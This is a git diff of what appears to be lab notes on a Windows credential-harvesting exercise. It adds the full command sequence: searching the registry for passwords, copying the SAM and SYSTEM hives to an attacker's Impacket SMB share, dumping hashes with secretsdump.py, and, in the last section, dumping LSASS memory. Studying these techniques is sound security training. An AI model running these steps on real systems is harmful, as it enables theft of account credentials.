@@ -35,7 +35,7 @@ reg query HKLM /f password /t REG_SZ /s > results.txt
 findstr "flag" results.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -63,7 +63,7 @@ type c:\Windows\System32\config\sam
 copy c:\Windows\System32\config\sam C:\Users\thm\Desktop\ 
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Metasploit's HashDump
 
@@ -132,8 +132,37 @@ Let's this time decrypt it using one of the Impacket tools: `secretsdump.py`, wh
 
 Move both SAM and system files to the AttackBox and run the following command:
 
-**Kali - not yet done**
+**Kali**
 
 ```
-python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
+mkdir public
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 smb public/
 ```
+
+**Victim(cmd)**
+
+```
+net use \\$KALI\smb
+copy C:\users\thm\Desktop\sam-reg \\$KALI\smb
+copy C:\users\thm\Desktop\system-reg \\$KALI\smb
+copy C:\users\thm\Desktop\sam \\$KALI\smb
+copy C:\users\thm\Desktop\system \\$KALI\smb
+```
+
+<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**&#x20;
+
+```
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam-reg -system system-reg LOCAL
+```
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+## Local Security Authority Subsystem Service (LSASS)
+
+### Graphic User Interface (GUI)
+
+To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".
+
+![](<../../.gitbook/assets/image (7).png>)
